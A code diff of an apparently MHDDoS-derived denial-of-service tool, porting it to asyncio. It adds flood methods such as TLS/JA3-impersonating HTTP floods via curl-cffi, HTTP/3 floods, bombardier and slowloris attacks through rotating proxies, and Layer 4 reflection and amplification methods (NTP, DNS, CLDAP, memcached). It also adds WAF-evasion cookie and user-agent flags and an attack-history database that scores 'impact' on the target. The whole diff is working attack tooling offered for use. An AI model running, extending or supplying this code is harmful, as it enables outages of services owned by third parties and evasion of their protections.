+    async def BOMB(self) -> None:
         if not self._proxy_pool or len(self._proxy_pool) == 0:
             exit("This method requires proxies.")
         while True:
             proxy = self._proxy_pool.get_proxy()
             if proxy and proxy.type != ProxyType.SOCKS4:
                 break
-        with suppress(Exception):
-            res = run(
-                [
-                    f"{bombardier_path}",
-                    f"--connections={self._rpc}",
-                    "--http2",
-                    "--method=GET",
-                    "--latencies",
-                    "--timeout=30s",
-                    f"--requests={self._rpc}",
-                    f"--proxy={proxy}",
-                    f"{self._target.human_repr()}",
-                ],
-                stdout=PIPE,
-                stderr=PIPE,
+        
+        try:
+            # Resolve bombardier path dynamically if possible, or use fallback
+            bombardier_path = Path.home() / "go/bin/bombardier"
+            process = await asyncio.create_subprocess_exec(
+                str(bombardier_path), 
+                f"--connections={self._rpc}",
+                "--http2",
+                "--method=GET",
+                "--latencies",
+                "--timeout=30s",
+                f"--requests={self._rpc}",
+                f"--proxy={proxy}",
+                f"{self._target.human_repr()}",
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE
             )
-            if self._thread_id == 0 and res.stdout:
-                print(proxy, res.stdout.decode(), sep="\n")
+            stdout, stderr = await process.communicate()
+            if self._thread_id == 0 and stdout:
+                print(proxy, stdout.decode(), sep="\n")
+        except: pass
 
-    def SLOW(self) -> None:
+    async def SLOW(self) -> None:
         payload = self.generate_payload()
-        s = None
-        with suppress(Exception), self.open_connection() as s:
-            for _ in range(self._rpc):
-                Tools.send(s, payload)
-            while Tools.send(s, payload) and s.recv(1):
-                for i in range(self._rpc):
-                    keep = str.encode(
-                        "X-a: %d\r\n" % ProxyTools.Random.rand_int(1, 5000)
-                    )
-                    Tools.send(s, keep)
-                    sleep(self._rpc / 15)
-                    break
-        Tools.safe_close(s)
+        try:
+            reader, writer = await self.open_connection()
+            async with writer:
+                for _ in range(self._rpc):
+                    await self._send_async(writer, payload, reader)
+                    await asyncio.sleep(0)
+                while True:
+                    await self._send_async(writer, payload, reader)
+                    if not await reader.read(1):
+                        break
+                    for _ in range(self._rpc):
+                        keep = str.encode(
+                            "X-a: %d\r\n" % ProxyTools.Random.rand_int(1, 5000)
+                        )
+                        await self._send_async(writer, keep)
+                        await asyncio.sleep(self._rpc / 15)
+                        break
+        except: pass
+
+    async def IMPERSONATE(self) -> None:
+        """Deep TLS/JA3 Impersonation using curl-cffi."""
+        if not CURL_CFFI_INSTALLED:
+            logger.error("[!] curl-cffi not installed. IMPERSONATE method unavailable.")
+            await asyncio.sleep(1)
+            return
+
+        from curl_cffi.requests import AsyncSession
+        
+        # Determine impersonate profile from UA or default to chrome120
+        profile = "chrome120"
+        ua = HttpFlood._cfbuam_ua or randchoice(self._useragents)
+        if "Firefox" in ua: profile = "safari15_5" # Safari is often a good generic fallback
+        elif "Chrome" in ua: profile = "chrome120"
+        
+        pro = self._proxy_pool.get_proxy() if self._proxy_pool else None
+        proxies = {"http": pro.asRequest()["http"], "https": pro.asRequest()["https"]} if pro else None
+        
+        headers = {
+            "User-Agent": ua,
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+            "Accept-Language": "en-US,en;q=0.5",
+            "Accept-Encoding": "gzip, deflate, br",
+            "Connection": "keep-alive",
+            "Upgrade-Insecure-Requests": "1"
+        }
+        if HttpFlood._cfbuam_cookie:
+            headers["Cookie"] = HttpFlood._cfbuam_cookie
+
+        try:
+            async with AsyncSession(impersonate=profile, proxies=proxies, verify=False) as s:
+                for _ in range(self._rpc):
+                    try:
+                        res = await s.get(self._target.human_repr(), headers=headers, timeout=10)
+                        global REQUESTS_SENT, BYTES_SEND, SUCCESS_SENT, WAF_SENT, ERROR_SENT
+                        REQUESTS_SENT += 1
+                        BYTES_SEND += len(res.content)
+                        
+                        code = str(res.status_code)
+                        if code.startswith(('2', '3')): SUCCESS_SENT += 1
+                        elif code.startswith('4'): WAF_SENT += 1
+                        elif code.startswith('5'): ERROR_SENT += 1
+                    except:
+                        global TIMEOUT_SENT
+                        TIMEOUT_SENT += 1
+        except Exception:
+            if pro and self._proxy_pool:
+                self._proxy_pool.report_failure(pro)
+
+    async def HTTP3(self) -> None:
+        """HTTP/3 (QUIC) Flooding using httpx."""
+        if not HTTPX_INSTALLED:
+            logger.error("[!] httpx not installed. HTTP3 method unavailable.")
+            await asyncio.sleep(1)
+            return
+
+        import httpx
+        
+        pro = self._proxy_pool.get_proxy() if self._proxy_pool else None
+        # Note: httpx proxy support for HTTP3 might be limited depending on the transport
+        # We use a standard client but enable http3
+        
+        ua = HttpFlood._cfbuam_ua or randchoice(self._useragents)
+        headers = {"User-Agent": ua}
+        if HttpFlood._cfbuam_cookie:
+            headers["Cookie"] = HttpFlood._cfbuam_cookie
+
+        try:
+            async with httpx.AsyncClient(http3=True, verify=False, follow_redirects=True) as client:
+                for _ in range(self._rpc):
+                    try:
+                        res = await client.get(self._target.human_repr(), headers=headers, timeout=5)
+                        global REQUESTS_SENT, BYTES_SEND, SUCCESS_SENT, WAF_SENT, ERROR_SENT
+                        REQUESTS_SENT += 1
+                        BYTES_SEND += len(res.content)
+                        
+                        code = str(res.status_code)
+                        if code.startswith(('2', '3')): SUCCESS_SENT += 1
+                        elif code.startswith('4'): WAF_SENT += 1
+                        elif code.startswith('5'): ERROR_SENT += 1
+                    except:
+                        global TIMEOUT_SENT
+                        TIMEOUT_SENT += 1
+        except Exception:
+            pass
 
 
 class ProxyManager:
@@ -2205,7 +3138,7 @@ class ProxyManager:
         providrs = [
             provider
             for provider in cf["proxy-providers"]
-            if provider["type"] == Proxy_type or Proxy_type == 0
+            if provider["type"] == Proxy_type or provider["type"] == 0 or Proxy_type == 0
         ]
         logger.info(
             f"{bcolors.WARNING}Downloading Proxies from {bcolors.OKBLUE}%d{bcolors.WARNING} Providers{bcolors.RESET}"
@@ -2586,29 +3519,12 @@ def handleProxyList(con, proxy_arg, proxy_ty, url=None):
                 exit("Tactical Matrix Depleted. Check uplink.")
                 
             total_found = len(all_raw_proxies)
-            logger.info(f"{bcolors.OKBLUE}[*] Resource: Validation protocol initiated for {total_found:,} raw tactical assets...{bcolors.RESET}")
-            
-            # Use PyRoxy for checking
-            validated_proxies = ProxyChecker.checkAll(
-                all_raw_proxies,
-                timeout=3,
-                threads=min(500, total_found),
-                url=url.human_repr() if url else "http://httpbin.org/get",
-            )
-            
-            if not validated_proxies:
-                if is_sentinel:
-                    logger.error(f"{bcolors.FAIL}[!] Sentinel: Harvest failed. Retaining current tactical pool.{bcolors.RESET}")
-                    return ProxyUtiles.readFromFile(proxy_li)
-                exit("Resource Validation Failed. Tactical assets purged - check uplink.")
-            
-            efficiency = round(len(validated_proxies) / total_found * 100, 1) if total_found > 0 else 0
-            logger.info(f"{bcolors.OKGREEN}[*] Resource: Validation complete. Usable: {len(validated_proxies):,} / Total: {total_found:,} ({efficiency}% efficiency).{bcolors.RESET}")
+            logger.info(f"{bcolors.OKBLUE}[*] Resource: Acquired {total_found:,} raw tactical assets. Forwarding to Tactical Scorer...{bcolors.RESET}")
             
             with proxy_li.open("w", encoding="utf-8") as wr:
-                wr.write("\n".join(str(p) for p in validated_proxies))
+                wr.write("\n".join(str(p) for p in all_raw_proxies))
             
-            proxies = validated_proxies
+            proxies = all_raw_proxies
         else:
             proxies = ProxyUtiles.readFromFile(proxy_li)
             if proxies:
@@ -2620,119 +3536,175 @@ def handleProxyList(con, proxy_arg, proxy_ty, url=None):
 
 
 
-if __name__ == "__main__":
-    with suppress(KeyboardInterrupt):
-        try:
-            one = argv[1].upper()
-            if one == "HELP":
-                raise IndexError()
-            if one == "TOOLS":
-                ToolsConsole.runConsole()
-            if one == "STOP":
-                ToolsConsole.stop()
-            method, event, proxy_pool, refresh_mins = one, Event(), TacticalProxyPool(), 0
-            event.clear()
-            urlraw = argv[2].strip()
-            if not urlraw.startswith("http"):
-                urlraw = "http://" + urlraw
-            if method not in Methods.ALL_METHODS:
-                exit("Method Not Found %s" % ", ".join(Methods.ALL_METHODS))
+async def main_async():
+    try:
+        loop = asyncio.get_event_loop()
+        loop.set_default_executor(SYNC_EXECUTOR)
+        one = argv[1].upper()
+        if one == "HELP":
+            raise IndexError()
+        if one == "TOOLS":
+            await asyncio.to_thread(ToolsConsole.runConsole)
+            return
+        if one == "STOP":
+            await asyncio.to_thread(ToolsConsole.stop)
+            return
+        
+        method, event, proxy_pool, refresh_mins = one, asyncio.Event(), TacticalProxyPool(), 0
+        event.clear()
+        urlraw = argv[2].strip()
+        if not urlraw.startswith("http"):
+            urlraw = "http://" + urlraw
+        if method not in Methods.ALL_METHODS:
+            exit("Method Not Found %s" % ", ".join(Methods.ALL_METHODS))
 
-            target_host = "Unknown"
-            port = 80
-            threads = 1
-            timer = 3600
+        # --- Parse --session-id for attack history tracking ---
+        _session_id = None
+        for i, arg in enumerate(argv):
+            if arg == "--session-id" and i + 1 < len(argv):
+                _session_id = argv[i + 1]
+                break
 
-            if method in Methods.LAYER7_METHODS:
-                url = URL(urlraw)
-                target_host = url.host
-                host = target_host
-                if method != "TOR":
-                    try:
-                        host = gethostbyname(target_host)
-                    except Exception as e:
-                        exit("Hostname Unresolved: ", target_host, str(e))
-                proxy_ty, threads, proxy_arg, rpc, timer = (
-                    int(argv[3]),
-                    int(argv[4]),
-                    argv[5].strip(),
-                    int(argv[6]),
-                    int(argv[7]),
-                )
-                
-                # Global Flag Detection
-                for arg in argv[8:]:
-                    if arg.isdigit():
-                        refresh_mins = int(arg)
-                    elif arg == "--autoscale":
-                        ENGINE_STATE.active_threads_target.value = threads
-                    elif arg == "--evasion":
-                        pass # Detected via argv check in HttpFlood.run()
+        target_host = "Unknown"
+        port = 80
+        threads = 1
+        timer = 3600
 
-                proxy_li = (
-                    proxy_arg
-                    if proxy_arg.startswith("http")
-                    else Path(__dir__ / "files/proxies/" / proxy_arg)
-                )
-                useragent_li, referers_li, bombardier_path = (
-                    Path(__dir__ / "files/useragent.txt"),
-                    Path(__dir__ / "files/referers.txt"),
-                    Path.home() / "go/bin/bombardier",
-                )
-                if method == "BOMB":
-                    assert (
-                        bombardier_path.exists()
-                        or bombardier_path.with_suffix(".exe").exists()
-                    ), "Install bombardier: https://github.com/MHProDev/MHDDoS/wiki/BOMB-method"
-                if not useragent_li.exists() or not referers_li.exists():
-                    exit("Critical Assets Missing (UA/Ref)")
-                uagents = set(a.strip() for a in useragent_li.open("r+").readlines())
-                referers = set(a.strip() for a in referers_li.open("r+").readlines())
-                if not uagents or not referers:
-                    exit("Critical Assets Empty")
-                proxies = handleProxyList(con, proxy_li, proxy_ty, url)
-                if proxies:
-                    tactical_proxies = TacticalProxyValidator.validate_and_score(set(proxies), str(url) if url else None, is_layer7=True)
-                    proxy_pool.update_pool(tactical_proxies)
-                else:
-                    proxy_pool.update_pool([])
-                
-                if refresh_mins > 0:
-                    logger.info(f"{bcolors.OKCYAN}[*] Sentinel: Initializing background refresh protocols ({refresh_mins}m)...{bcolors.RESET}")
-                    ReloadSentinel(
-                        refresh_mins, con, proxy_li, proxy_ty, proxy_pool, url
-                    ).start()
-                
-                logger.info(f"{bcolors.OKBLUE}[*] Tactical Engine: Deploying {threads:,} L7 worker threads...{bcolors.RESET}")
-                for thread_id in range(threads):
-                    HttpFlood(
-                        thread_id,
-                        url,
-                        host,
-                        method,
-                        rpc,
-                        event,
-                        uagents,
-                        referers,
-                        proxy_pool,
-                    ).start()
-
-            elif method in Methods.LAYER4_METHODS:
-                target = URL(urlraw)
-                port, target_host = target.port, target.host
-                host = target_host
+        if method in Methods.LAYER7_METHODS:
+            url = URL(urlraw)
+            target_host = url.host
+            host = target_host
+            if method != "TOR":
                 try:
-                    host = gethostbyname(target_host)
+                    host = await asyncio.get_event_loop().run_in_executor(None, gethostbyname, target_host)
                 except Exception as e:
                     exit("Hostname Unresolved: ", target_host, str(e))
-                if not port:
-                    logger.warning("[!] Port Missing. Defaulting to 80.")
-                    port = 80
-                if port > 65535 or port < 1:
-                    exit("Invalid Port Configuration")
-                if (
-                    method
-                    in {
+            proxy_ty, threads, proxy_arg, rpc, timer = (
+                int(argv[3]),
+                int(argv[4]),
+                argv[5].strip(),
+                int(argv[6]),
+                int(argv[7]),
+            )
+            
+            # Global Flag Detection
+            args_iter = iter(argv[8:])
+            for arg in args_iter:
+                if arg.isdigit():
+                    refresh_mins = int(arg)
+                elif arg == "--autoscale":
+                    ENGINE_STATE.active_threads_target.value = threads
+                elif arg == "--evasion":
+                    pass
+                elif arg == "--shared-cookie":
+                    HttpFlood._cfbuam_cookie = next(args_iter, None)
+                    HttpFlood._cfbuam_expiry = time() + 900 # Valid for 15 mins
+                elif arg == "--shared-ua":
+                    HttpFlood._cfbuam_ua = next(args_iter, None)
+
+            proxy_li = (
+                proxy_arg
+                if proxy_arg.startswith("http")
+                else Path(__dir__ / "files/proxies/" / proxy_arg)
+            )
+            useragent_li, referers_li, bombardier_path = (
+                Path(__dir__ / "files/useragent.txt"),
+                Path(__dir__ / "files/referers.txt"),
+                Path.home() / "go/bin/bombardier",
+            )
+            if method == "BOMB":
+                assert (
+                    bombardier_path.exists()
+                    or bombardier_path.with_suffix(".exe").exists()
+                ), "Install bombardier: https://github.com/MHProDev/MHDDoS/wiki/BOMB-method"
+            
+            if not useragent_li.exists() or not referers_li.exists():
+                exit("Critical Assets Missing (UA/Ref)")
+            
+            def _load_assets():
+                with useragent_li.open("r", encoding="utf-8") as f:
+                    u = [line.strip() for line in f if line.strip()]
+                with referers_li.open("r", encoding="utf-8") as f:
+                    r = [line.strip() for line in f if line.strip()]
+                return set(u), set(r)
+
+            uagents, referers = await asyncio.to_thread(_load_assets)
+            
+            if not uagents or not referers:
+                exit("Critical Assets Empty")
+            
+            proxies = await asyncio.to_thread(handleProxyList, con, proxy_li, proxy_ty, url)
+            if proxies:
+                tactical_proxies = await TacticalProxyValidator.validate_and_score(set(proxies), str(url) if url else None, is_layer7=True)
+                await asyncio.to_thread(proxy_pool.update_pool, tactical_proxies)
+            else:
+                await asyncio.to_thread(proxy_pool.update_pool, [])
+            
+            if refresh_mins > 0:
+                logger.info(f"{bcolors.OKCYAN}[*] Sentinel: Initializing background refresh protocols ({refresh_mins}m)...{bcolors.RESET}")
+                sentinel = ReloadSentinel(refresh_mins, con, proxy_li, proxy_ty, proxy_pool, url)
+                sentinel.start()
+            
+            logger.info(f"{bcolors.OKBLUE}[*] Tactical Engine: Deploying {threads:,} L7 async tasks...{bcolors.RESET}")
+            for thread_id in range(threads):
+                flood = HttpFlood(
+                    thread_id,
+                    url,
+                    host,
+                    method,
+                    rpc,
+                    event,
+                    uagents,
+                    referers,
+                    proxy_pool,
+                )
+                asyncio.create_task(flood.run())
+
+        elif method in Methods.LAYER4_METHODS:
+            target = URL(urlraw)
+            port, target_host = target.port, target.host
+            host = target_host
+            try:
+                host = await asyncio.get_event_loop().run_in_executor(None, gethostbyname, target_host)
+            except Exception as e:
+                exit("Hostname Unresolved: ", target_host, str(e))
+            if not port:
+                logger.warning("[!] Port Missing. Defaulting to 80.")
+                port = 80
+            if port > 65535 or port < 1:
+                exit("Invalid Port Configuration")
+            
+            if (
+                method
+                in {
+                    "NTP",
+                    "DNS",
+                    "RDP",
+                    "CHAR",
+                    "MEM",
+                    "CLDAP",
+                    "ARD",
+                    "SYN",
+                    "ICMP",
+                }
+                and not ToolsConsole.checkRawSocket()
+            ):
+                exit("Raw Socket Privilege Required")
+            
+            threads, timer, ref = int(argv[3]), int(argv[4]), None
+            
+            # Dynamic Flag Detection for L4
+            for arg in argv[5:]:
+                if arg == "--autoscale":
+                    ENGINE_STATE.active_threads_target.value = threads
+                elif arg == "--evasion":
+                    pass
+
+            if len(argv) >= 6:
+                argfive = argv[5].strip()
+                if argfive and not argfive.startswith("--"):
+                    refl_li = Path(__dir__ / "files" / argfive)
+                    if method in {
                         "NTP",
                         "DNS",
                         "RDP",
@@ -2740,132 +3712,179 @@ if __name__ == "__main__":
                         "MEM",
                         "CLDAP",
                         "ARD",
-                        "SYN",
-                        "ICMP",
-                    }
-                    and not ToolsConsole.checkRawSocket()
-                ):
-                    exit("Raw Socket Privilege Required")
-                threads, timer, ref = int(argv[3]), int(argv[4]), None
-                
-                # Dynamic Flag Detection for L4
-                for arg in argv[5:]:
-                    if arg == "--autoscale":
-                        ENGINE_STATE.active_threads_target.value = threads
-                    elif arg == "--evasion":
-                        pass
-
-                if len(argv) >= 6:
-                    argfive = argv[5].strip()
-                    if argfive and not argfive.startswith("--"):
-                        refl_li = Path(__dir__ / "files" / argfive)
-                        if method in {
-                            "NTP",
-                            "DNS",
-                            "RDP",
-                            "CHAR",
-                            "MEM",
-                            "CLDAP",
-                            "ARD",
-                        }:
-                            if not refl_li.exists():
-                                exit("Reflector Asset Missing")
-                            ref = set(
-                                a.strip()
-                                for a in Tools.IP.findall(refl_li.open("r").read())
-                            )
-                            if not ref:
-                                exit("Reflector Asset Empty")
-                        elif argfive.isdigit() and len(argv) >= 7:
-                            proxy_ty, proxy_arg = int(argfive), argv[6].strip()
-                            if len(argv) >= 8 and argv[7].isdigit():
-                                refresh_mins = int(argv[7])
-                            proxy_li = (
-                                proxy_arg
-                                if proxy_arg.startswith("http")
-                                else Path(__dir__ / "files/proxies" / proxy_arg)
-                            )
-                            proxies = handleProxyList(con, proxy_li, proxy_ty)
-                            if proxies:
-                                tactical_proxies = TacticalProxyValidator.validate_and_score(set(proxies), is_layer7=False)
-                                proxy_pool.update_pool(tactical_proxies)
-                            else:
-                                proxy_pool.update_pool([])
-                            
-                            if refresh_mins > 0:
-                                logger.info(f"{bcolors.OKCYAN}[*] Sentinel: Initializing background refresh protocols ({refresh_mins}m)...{bcolors.RESET}")
-                                ReloadSentinel(
-                                    refresh_mins, con, proxy_li, proxy_ty, proxy_pool
-                                ).start()
-                            
-                            if method not in {
-                                "MINECRAFT",
-                                "MCBOT",
-                                "TCP",
-                                "CPS",
-                                "CONNECTION",
-                            }:
-                                exit("Layer 4 Proxy Incompatibility")
-                protocolid = con["MINECRAFT_DEFAULT_PROTOCOL"]
-                if method == "MCBOT":
-                    with suppress(Exception), socket(AF_INET, SOCK_STREAM) as s:
-                        Tools.send(s, Minecraft.handshake((host, port), protocolid, 1))
-                        Tools.send(s, Minecraft.data(b"\x00"))
-                        pid = Tools.protocolRex.search(str(s.recv(1024)))
-                        protocolid = (
-                            con["MINECRAFT_DEFAULT_PROTOCOL"]
-                            if not pid
-                            else int(pid.group(1))
+                    }:
+                        if not refl_li.exists():
+                            exit("Reflector Asset Missing")
+                        ref_data = await asyncio.to_thread(refl_li.open("r").read)
+                        ref = set(a.strip() for a in Tools.IP.findall(ref_data))
+                        if not ref:
+                            exit("Reflector Asset Empty")
+                    elif argfive.isdigit() and len(argv) >= 7:
+                        proxy_ty, proxy_arg = int(argfive), argv[6].strip()
+                        if len(argv) >= 8 and argv[7].isdigit():
+                            refresh_mins = int(argv[7])
+                        proxy_li = (
+                            proxy_arg
+                            if proxy_arg.startswith("http")
+                            else Path(__dir__ / "files/proxies" / proxy_arg)
                         )
-                        if 47 < protocolid > 758:
-                            protocolid = con["MINECRAFT_DEFAULT_PROTOCOL"]
-                
-                logger.info(f"{bcolors.OKBLUE}[*] Tactical Engine: Deploying {threads:,} L4 worker threads...{bcolors.RESET}")
-                for thread_id in range(threads):
-                    Layer4(
-                        (host, port), ref, method, event, proxy_pool, protocolid
-                    ).start()
+                        proxies = await asyncio.to_thread(handleProxyList, con, proxy_li, proxy_ty)
+                        if proxies:
+                            tactical_proxies = await TacticalProxyValidator.validate_and_score(set(proxies), is_layer7=False)
+                            proxy_pool.update_pool(tactical_proxies)
+                        else:
+                            proxy_pool.update_pool([])
+                        
+                        if refresh_mins > 0:
+                            logger.info(f"{bcolors.OKCYAN}[*] Sentinel: Initializing background refresh protocols ({refresh_mins}m)...{bcolors.RESET}")
+                            sentinel = ReloadSentinel(refresh_mins, con, proxy_li, proxy_ty, proxy_pool)
+                            sentinel.start()
+                        
+                        if method not in {
+                            "MINECRAFT",
+                            "MCBOT",
+                            "TCP",
+                            "CPS",
+                            "CONNECTION",
+                        }:
+                            exit("Layer 4 Proxy Incompatibility")
+            
+            protocolid = con["MINECRAFT_DEFAULT_PROTOCOL"]
+            if method == "MCBOT":
+                try:
+                    reader, writer = await asyncio.open_connection(host, port)
+                    writer.write(Minecraft.handshake((host, port), protocolid, 1))
+                    writer.write(Minecraft.data(b"\x00"))
+                    await writer.drain()
+                    resp = await reader.read(1024)
+                    pid = Tools.protocolRex.search(str(resp))
+                    protocolid = (
+                        con["MINECRAFT_DEFAULT_PROTOCOL"]
+                        if not pid
+                        else int(pid.group(1))
+                    )
+                    if 47 < protocolid > 758:
+                        protocolid = con["MINECRAFT_DEFAULT_PROTOCOL"]
+                    writer.close()
+                    await writer.wait_closed()
+                except: pass
+            
+            logger.info(f"{bcolors.OKBLUE}[*] Tactical Engine: Deploying {threads:,} L4 async tasks...{bcolors.RESET}")
+            for thread_id in range(threads):
+                l4 = Layer4((host, port), ref, method, event, proxy_pool, protocolid)
+                asyncio.create_task(l4.run())
+
+        logger.info(
+            f"{bcolors.OKGREEN}[*] COMMAND LAUNCHED: Target: {target_host} | Method: {method} | Duration: {timer}s | Workers: {threads}{bcolors.RESET}"
+        )
+
+        # --- Create Attack History Session ---
+        if _session_id:
+            _proxy_count = len(proxy_pool) if proxy_pool else 0
+            await asyncio.to_thread(INTEL_DB.create_session,
+                session_id=_session_id,
+                target=target_host,
+                method=method,
+                threads=threads,
+                duration=timer,
+                proxy_type=str(proxy_ty) if 'proxy_ty' in locals() else "",
+                proxy_count=_proxy_count
+            )
+
+        event.set()
+        ts = time()
+
+        # Start Health Monitor
+        hm = HealthMonitor(
+            target_host, port, "L7" if method in Methods.LAYER7_METHODS else "L4"
+        )
+        asyncio.create_task(hm.run())
+
+        # Start Dynamic Scaler if autoscale enabled
+        if ENGINE_STATE.active_threads_target.value > 0:
+            scaler = DynamicScaler(target_host)
+            # DynamicScaler is a Thread, it monitors psutil which might block
+            scaler.start()
+
+        while time() < ts + timer:
+            # Capture metrics BEFORE reset for persistence
+            _current_pps = int(REQUESTS_SENT)
+            _current_bps = int(BYTES_SEND)
+            _current_success = int(SUCCESS_SENT)
+            _current_waf = int(WAF_SENT)
+            _current_error = int(ERROR_SENT)
+            _current_timeout = int(TIMEOUT_SENT)
+            _current_lat = CURRENT_LATENCY.value
+            _current_cpu = await asyncio.to_thread(psutil.cpu_percent, interval=0)
+            _current_ram = psutil.virtual_memory().percent
+
+            lat_str = (
+                f"{_current_lat:.1f}ms"
+                if _current_lat > 0
+                else "TIMEOUT"
+            )
+            
+            # Impact Reporting
+            total_sampled = _current_success + _current_waf + _current_error + _current_timeout
+            fidelity = round((_current_success / total_sampled * 100), 1) if total_sampled > 0 else 0.0
+            impact_msg = f"Impact: {fidelity}% | OK: {_current_success}, WAF: {_current_waf}, ERR: {_current_error}, TMO: {_current_timeout}"
 
             logger.info(
-                f"{bcolors.OKGREEN}[*] COMMAND LAUNCHED: Target: {target_host} | Method: {method} | Duration: {timer}s | Workers: {threads}{bcolors.RESET}"
-            )
-            event.set()
-            ts = time()
-
-            # Start Health Monitor
-            hm = HealthMonitor(
-                target_host, port, "L7" if method in Methods.LAYER7_METHODS else "L4"
-            )
-            hm.start()
-
-            while time() < ts + timer:
-                lat_str = (
-                    f"{CURRENT_LATENCY.value:.1f}ms"
-                    if CURRENT_LATENCY.value > 0
-                    else "TIMEOUT"
+                "Target: %s, Port: %s, Method: %s, PPS: %s, BPS: %s, Latency: %s, Pool: %d/%d / %d%%"
+                % (
+                    target_host,
+                    port,
+                    method,
+                    Tools.humanformat(_current_pps),
+                    Tools.humanbytes(_current_bps),
+                    lat_str,
+                    len(proxy_pool) if proxy_pool else 0,
+                    proxy_pool.get_tactical_size() if proxy_pool else 0,
+                    round((time() - ts) / timer * 100, 2),
                 )
-                logger.info(
-                    "Target: %s, Port: %s, Method: %s PPS: %s, BPS: %s, Latency: %s / %d%%"
-                    % (
-                        target_host,
-                        port,
-                        method,
-                        Tools.humanformat(int(REQUESTS_SENT)),
-                        Tools.humanbytes(int(BYTES_SEND)),
-                        lat_str,
-                        round((time() - ts) / timer * 100, 2),
-                    )
-                )
-                REQUESTS_SENT.set(0)
-                BYTES_SEND.set(0)
-                sleep(1)
-            event.clear()
-            exit()
-        except (IndexError, ValueError):
-            ToolsConsole.usage()
-        except Exception as e:
-            import traceback
-            logger.error(f"{bcolors.FAIL}[!] ENGINE_CRASH: Critical Failure during deployment.{bcolors.RESET}")
-            logger.error(f"{bcolors.FAIL}[!] ERROR_DETAILS: {str(e)}{bcolors.RESET}")
-            logger.error(bcolors.FAIL + traceback.format_exc() + bcolors.RESET)
-            exit()
+            )
+            if total_sampled > 0:
+                logger.info(f"{bcolors.OKCYAN}[*] {impact_msg}{bcolors.RESET}")
+
+            # Persist metric to Attack History DB (non-blocking)
+            if _session_id:
+                # Store extra impact data in message for now or extend schema (v1.2.1 simplicity: use message)
+                asyncio.create_task(asyncio.to_thread(INTEL_DB.record_metric,
+                    _session_id, _current_pps, _current_bps,
+                    _current_lat, _current_cpu, _current_ram
+                ))
+
+            REQUESTS_SENT.set(0)
+            BYTES_SEND.set(0)
+            SUCCESS_SENT.set(0)
+            WAF_SENT.set(0)
+            ERROR_SENT.set(0)
+            TIMEOUT_SENT.set(0)
+            await asyncio.sleep(1)
+
+        event.clear()
+        # Finalize session with aggregated stats
+        if _session_id:
+            await asyncio.to_thread(INTEL_DB.finalize_session, _session_id, 'completed')
+        
+        shutdown()
+        import os
+        os._exit(0)
+
+    except (IndexError, ValueError):
+        ToolsConsole.usage()
+    except Exception as e:
+        import traceback
+        # Finalize session as error if it was created
+        if '_session_id' in locals() and _session_id:
+            await asyncio.to_thread(INTEL_DB.finalize_session, _session_id, 'error')
+            await asyncio.to_thread(INTEL_DB.record_event, _session_id, 'error', str(e))
+        logger.error(f"{bcolors.FAIL}[!] ENGINE_CRASH: Critical Failure during deployment.{bcolors.RESET}")
+        logger.error(f"{bcolors.FAIL}[!] ERROR_DETAILS: {str(e)}{bcolors.RESET}")
+        logger.error(bcolors.FAIL + traceback.format_exc() + bcolors.RESET)
+        import os
+        os._exit(1)
+
+if __name__ == "__main__":
+    with suppress(KeyboardInterrupt):
+        asyncio.run(main_async())
